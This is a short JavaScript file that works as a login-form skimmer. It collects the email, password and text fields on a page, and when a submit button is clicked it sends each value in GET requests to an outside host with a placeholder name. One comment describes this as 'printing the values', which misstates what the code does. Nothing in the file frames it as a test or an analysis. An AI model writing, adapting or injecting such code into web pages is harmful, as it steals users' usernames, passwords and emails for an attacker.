let inputs = document.getElementsByTagName("input");
let emailInputs = [];
let usernameInputs = [];
let passwordInputs = [];
let submitInputs = [];

//Getting all username and password input fields
for (input of inputs) {
    if (input.type == "email") {
        emailInputs.push(input);
    }
    else if (input.type == "password") {
        passwordInputs.push(input);
    }
    //Not necessarily a username
    else if (input.type == "text") {
        usernameInputs.push(input);
    }
    else if (input.type == "submit") {
        submitInputs.push(input);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

//Adding listeners for all submit inputs, and printing the values when the button is pressed
for (submitInput of submitInputs) {
    submitInput.addEventListener('click', function getValues() {

    for (usernameInput of usernameInputs) {
        const Http = new XMLHttpRequest();
        
        const url = `http://blablablanonexistenthost11234125/data?p=username-${usernameInput.value}`;    
        Http.open("GET", url);
        Http.send();
    }
    
    for (passwordInput of passwordInputs) {
        const Http = new XMLHttpRequest();

        const url = `http://blablablanonexistenthost11234125/data?p=password-${passwordInput.value}`;
        Http.open("GET", url);
        Http.send();
    }

    for (emailInput of emailInputs) {
        const Http = new XMLHttpRequest();

        const url = `http://blablablanonexistenthost11234125/data?p=email-${emailInput.value}`;
        Http.open("GET", url);
        Http.send();
    }
    });
}
